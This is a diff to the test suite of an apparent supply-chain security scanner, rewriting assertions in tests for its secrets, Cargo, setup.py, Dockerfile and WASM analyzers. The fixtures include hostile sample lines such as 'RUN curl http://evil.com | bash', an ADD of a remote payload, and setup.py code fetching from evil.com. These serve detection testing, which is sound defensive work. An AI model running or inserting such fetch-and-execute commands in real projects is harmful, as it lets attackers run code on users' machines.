@@ -19,22 +19,29 @@ class TestSecretsAnalyzer:
 
     def test_detects_aws_key(self):
         res = self.a.analyze(_entry(), 'aws_secret_key = "AKIA1234567890ABCDEF"')
-        assert any(f.severity == Severity.CRITICAL for f in res.findings)
-        assert any("AWS" in f.title for f in res.findings)
+        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
+        assert len(crit) >= 1
+        aws = [f for f in res.findings if "AWS" in f.title]
+        assert len(aws) >= 1
 
     def test_detects_github_token(self):
         res = self.a.analyze(_entry(), 'GITHUB_TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789abcd"')
-        assert any(f.severity == Severity.CRITICAL for f in res.findings)
-        assert any("GitHub" in f.title for f in res.findings)
+        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
+        assert len(crit) >= 1
+        gh = [f for f in res.findings if "GitHub" in f.title]
+        assert len(gh) >= 1
 
     def test_detects_private_key(self):
         res = self.a.analyze(_entry(), "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA")
-        assert any(f.severity == Severity.CRITICAL for f in res.findings)
-        assert any("Private" in f.title for f in res.findings)
+        crit = [f for f in res.findings if f.severity == Severity.CRITICAL]
+        assert len(crit) >= 1
+        pk = [f for f in res.findings if "Private" in f.title]
+        assert len(pk) >= 1
 
     def test_detects_db_url(self):
         res = self.a.analyze(_entry(), 'postgresql://user:pass@localhost/db')
-        assert any(f.severity == Severity.HIGH for f in res.findings)
+        high = [f for f in res.findings if f.severity == Severity.HIGH]
+        assert len(high) >= 1
 
     def test_clean_file_no_findings(self):
         res = self.a.analyze(_entry(), "hello world\nthis is a clean file\nno secrets here")
@@ -51,12 +58,14 @@ class TestCargoAnalyzer:
     def test_detects_git_dep(self):
         content = '[dependencies]\nfoo = { git = "https://github.com/evil/foo" }'
         res = self.a.analyze(_entry("Cargo.toml"), content)
-        assert any("git" in f.title.lower() for f in res.findings)
+        git = [f for f in res.findings if "git" in f.title.lower()]
+        assert len(git) >= 1
 
     def test_detects_build_script(self):
         content = 'build = "build.rs"'
         res = self.a.analyze(_entry("Cargo.toml"), content)
-        assert any("build script" in f.title.lower() for f in res.findings)
+        bs = [f for f in res.findings if "build script" in f.title.lower()]
+        assert len(bs) >= 1
 
     def test_clean_cargo(self):
         content = '[dependencies]\nserde = "1.0"\ntokio = { version = "1", features = ["full"] }'
@@ -66,12 +75,14 @@ class TestCargoAnalyzer:
     def test_build_rs_command(self):
         content = 'fn main() { let out = std::process::Command::new("curl"); }'
         res = self.a.analyze(_entry("build.rs"), content)
-        assert any("command" in f.title.lower() for f in res.findings)
+        cmd = [f for f in res.findings if "command" in f.title.lower()]
+        assert len(cmd) >= 1
 
     def test_build_rs_network(self):
         content = 'let resp = reqwest::blocking::get("http://evil.com");'
         res = self.a.analyze(_entry("build.rs"), content)
-        assert any("network" in f.title.lower() for f in res.findings)
+        net = [f for f in res.findings if "network" in f.title.lower()]
+        assert len(net) >= 1
 
 
 class TestPythonAnalyzer:
@@ -85,13 +96,15 @@ class TestPythonAnalyzer:
     def test_detects_cmdclass(self):
         content = "from setuptools import setup\nsetup(cmdclass={'install': EvilInstall})"
         res = self.a.analyze(_entry("setup.py"), content)
-        assert any("cmdclass" in f.title for f in res.findings) or \
-               any("setup.py" in f.description for f in res.findings)
+        cc = [f for f in res.findings if "cmdclass" in f.title]
+        sd = [f for f in res.findings if "setup.py" in (f.description or "")]
+        assert len(cc) >= 1 or len(sd) >= 1
 
     def test_detects_network_request(self):
         content = "import requests\nrequests.get('http://evil.com/payload')"
         res = self.a.analyze(_entry("setup.py"), content)
-        assert any("network" in f.title.lower() for f in res.findings)
+        net = [f for f in res.findings if "network" in f.title.lower()]
+        assert len(net) >= 1
 
     def test_clean_setup(self):
         content = "from setuptools import setup\nsetup(name='foo', version='1.0')"
@@ -104,23 +117,28 @@ class TestDockerfileAnalyzer:
 
     def test_detects_latest_tag(self):
         res = self.a.analyze(_entry("Dockerfile"), "FROM node:latest")
-        assert any("latest" in f.title for f in res.findings)
+        lt = [f for f in res.findings if "latest" in f.title]
+        assert len(lt) >= 1
 
     def test_detects_pipe_to_shell(self):
         res = self.a.analyze(_entry("Dockerfile"), "RUN curl http://evil.com | bash")
-        assert any("pipe" in f.title.lower() or "shell" in f.title.lower() for f in res.findings)
+        ps = [f for f in res.findings if "pipe" in f.title.lower() or "shell" in f.title.lower()]
+        assert len(ps) >= 1
 
     def test_detects_add_url(self):
         res = self.a.analyze(_entry("Dockerfile"), 'ADD https://evil.com/payload.tar.gz /tmp')
-        assert any("ADD" in f.title for f in res.findings)
+        add = [f for f in res.findings if "ADD" in f.title]
+        assert len(add) >= 1
 
     def test_detects_root_user(self):
         res = self.a.analyze(_entry("Dockerfile"), "FROM alpine\nRUN echo hello\nUSER root")
-        assert any("root" in f.title.lower() for f in res.findings)
+        root = [f for f in res.findings if "root" in f.title.lower()]
+        assert len(root) >= 1
 
     def test_detects_exposed_ssh(self):
         res = self.a.analyze(_entry("Dockerfile"), "EXPOSE 22")
-        assert any("SSH" in f.title for f in res.findings)
+        ssh = [f for f in res.findings if "SSH" in f.title]
+        assert len(ssh) >= 1
 
     def test_clean_with_user(self):
         content = "FROM node:18-alpine\nWORKDIR /app\nRUN npm ci\nUSER node\nCMD [\"node\", \"app.js\"]"
@@ -160,7 +178,6 @@ class TestWasmAnalyzer:
         """WASM with emscripten_run_script import — dangerous."""
         import struct
         def _leb(v):
-            """Encode v as unsigned LEB128."""
             buf = []
             while True:
                 byte = v & 0x7F
@@ -181,7 +198,8 @@ class TestWasmAnalyzer:
         section_header = struct.pack("<B", 2) + _leb(len(section_content))
         wasm = b"\x00asm\x01\x00\x00\x00" + section_header + section_content
         res = self.a.analyze_binary(_entry("test.wasm"), wasm)
-        assert any("emscripten_run_script" in f.title for f in res.findings)
+        em = [f for f in res.findings if "emscripten_run_script" in f.title]
+        assert len(em) >= 1
 
 
 class TestYaraAnalyzer:
